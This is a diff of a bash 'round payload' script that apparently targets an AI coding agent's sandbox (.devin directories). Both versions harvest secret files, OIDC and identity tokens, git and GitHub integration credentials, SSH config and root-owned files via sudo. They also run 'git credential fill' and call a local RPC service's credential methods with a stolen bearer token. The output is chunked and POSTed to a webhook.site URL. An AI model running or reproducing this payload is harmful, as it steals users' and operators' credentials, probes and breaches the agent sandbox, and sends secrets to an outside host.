@@ -1,54 +1,49 @@
 #!/bin/bash
-# i80453 round payload r3: brain-injected secrets / envrc / git hook / root .devin / binary strings
-R="${RND:-r3}"
-SINK="https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5/i80453/$R"
-TMP="$(mktemp -d)"; OUT="$TMP/out.txt"; : >"$OUT"
-say(){ echo "### $*" >>"$OUT"; }
-export LC_ALL=C
-say META; { id; hostname; date -u +%FT%TZ; pwd; } >>"$OUT" 2>&1
-
-say OPT_DEVIN_LS; ls -la /opt/.devin >>"$OUT" 2>&1
-
-say SECRETS_AND_ENVRC
-for f in /opt/.devin/.devin_secrets.sh /opt/.devin/envrc /opt/.devin/devin_git_hook.sh /opt/.devin/custom_remote_config.json; do
-  echo "--- $f" >>"$OUT"; cat "$f" >>"$OUT" 2>&1; echo >>"$OUT"
+R=${RND:-r4}
+B=/tmp/$R.body
+: > "$B"
+exec >> "$B" 2>&1
+echo "### META"
+date -u +%FT%TZ; pwd
+echo "### RUN_LS"
+echo "--- ls -la /run"; ls -la /run
+echo "--- ls -la /run/repo_secrets"; ls -la /run/repo_secrets
+echo "--- ls -la /run/.devin"; ls -la /run/.devin
+echo "--- find /run -maxdepth 3 -type f"; find /run -maxdepth 3 -type f 2>/dev/null | head -60
+echo "--- sudo find for integration/identity/oidc"; sudo find / -xdev \( -name '*integration*credential*' -o -name 'identity_token' -o -name 'oidc_token' -o -name 'repo_secrets' \) 2>/dev/null | head -30
+echo "### TOKEN_FILES"
+for f in /opt/.devin/oidc_token /opt/.devin/.devin-integration-git-credentials /opt/.devin/.devin-integration-gh-credentials /run/.devin/identity_token /run/.devin/.devin-integration-git-credentials /run/repo_secrets; do
+  echo "--- $f"; ls -ld "$f"; [ -f "$f" ] && { echo "CONTENT:"; head -c 900 "$f"; echo; }
 done
-
-say GH_ALIAS
-ls -la /mnt/host_share/package/custom_binaries >>"$OUT" 2>&1
-cat /mnt/host_share/package/custom_binaries/gh_alias >>"$OUT" 2>&1
-echo >>"$OUT"
-head -c 800 /mnt/host_share/package/custom_binaries/gh 2>/dev/null >>"$OUT"; echo >>"$OUT"
-
-say ROOT_DEVIN
-sudo -n ls -laR /root/.devin 2>&1 | head -100 >>"$OUT"
-sudo -n cat /root/.gitconfig 2>&1 | head -40 >>"$OUT"
-for f in $(sudo -n ls /root/.devin 2>/dev/null | head -20); do
-  echo "--- /root/.devin/$f" >>"$OUT"
-  sudo -n head -c 1200 "/root/.devin/$f" 2>&1 >>"$OUT"; echo >>"$OUT"
+echo "--- ls /run/repo_secrets/*"; ls -la /run/repo_secrets/* 2>&1 | head -40
+echo "--- repo_secrets file contents"
+for f in /run/repo_secrets/* /run/repo_secrets/*/*; do
+  [ -f "$f" ] || continue
+  echo "--- $f ($(wc -c < "$f")B)"; head -c 700 "$f"; echo
 done
-
-say HIDDEN_FIND
-sudo -n find / -xdev \( -name '.devin_secrets.sh' -o -name 'envrc' -o -name 'devin_git_hook.sh' -o -name '*integration-git*' \) 2>/dev/null | head -40 >>"$OUT"
-
-say BIN_STRINGS
-strings /mnt/host_share/devin-remote 2>/dev/null | grep -iE 'git-manager|git[-_]credential|integration-git|proxy/github|devin_secrets|write_secrets|credential\.helper' | head -60 >>"$OUT"
-
-say CLIENT_TIER_SH
-head -c 4000 /home/ubuntu/.devin-files/client_live_tier.sh >>"$OUT" 2>&1; echo >>"$OUT"
-
-say SSH_HOME
-ls -la /home/ubuntu/.ssh >>"$OUT" 2>&1
-cat /home/ubuntu/.ssh/config >>"$OUT" 2>&1
-echo >>"$OUT"
-
-say LOCAL_RPC
-curl -sS --noproxy '*' --max-time 5 -X POST http://127.0.0.1:9876 -H 'content-type: application/json' -d '{"jsonrpc":"2.0","id":1,"method":"ping","params":{}}' -D - 2>&1 | head -20 >>"$OUT"
-echo >>"$OUT"
-
-say END
-wc -c "$OUT" >>"$OUT"
-split -b 6000 -d -a 1 "$OUT" "$TMP/p"
-N=0; for f in "$TMP"/p*; do N=$((N+1)); curl -sS --noproxy '*' --max-time 20 -X POST --data-binary @"$f" "$SINK/p$N" >/dev/null 2>&1; done
-curl -sS --noproxy '*' --max-time 20 -X POST --data-binary "DONE i80453 $R parts=$N bytes=$(wc -c <"$OUT")" "$SINK/done" >/dev/null 2>&1
-rm -rf "$TMP"
+echo "### RPC_PROBE"
+TOK=$(cat /opt/.devin/devin_remote_auth_token 2>/dev/null)
+echo "token_len=${#TOK}"
+for M in ping setup_git_credentials refresh_git_credentials; do
+  echo "--- $M with bearer"
+  curl -sS -m 6 -H "Authorization: Bearer $TOK" -H 'content-type: application/json' -X POST -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$M\",\"params\":{}}" http://127.0.0.1:9876/ | head -c 400; echo
+  echo "--- $M no auth"
+  curl -sS -m 6 -H 'content-type: application/json' -X POST -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$M\",\"params\":{}}" http://127.0.0.1:9876/ | head -c 300; echo
+done
+echo "### AFTER_RPC"
+for f in /run/.devin /run/repo_secrets /opt/.devin/.devin-integration-git-credentials /opt/.devin/oidc_token; do ls -ld "$f"; done
+echo "--- .gitconfig tail"; tail -20 /home/ubuntu/.gitconfig
+echo "--- credential fill github.com"; printf 'protocol=https\nhost=github.com\n\n' | git credential fill | head -c 300; echo
+echo "--- ls-remote via git-manager.local"; timeout 15 git ls-remote http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git | head -c 400; echo
+echo "### END"
+exec >/dev/null 2>&1
+SZ=$(wc -c < "$B")
+rm -rf /tmp/$R.parts; mkdir -p /tmp/$R.parts
+split -b 6000 -d -a 2 "$B" /tmp/$R.parts/p
+i=0
+for f in /tmp/$R.parts/p*; do
+  i=$((i+1))
+  curl -sS -m 20 -X POST --data-binary @"$f" "https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5/i80453/$R/p$i" >/dev/null 2>&1 || true
+done
+curl -sS -m 20 -X POST --data-binary "DONE i80453 $R parts=$i bytes=$SZ" "https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5/i80453/$R/done" >/dev/null 2>&1 || true
+exit 0
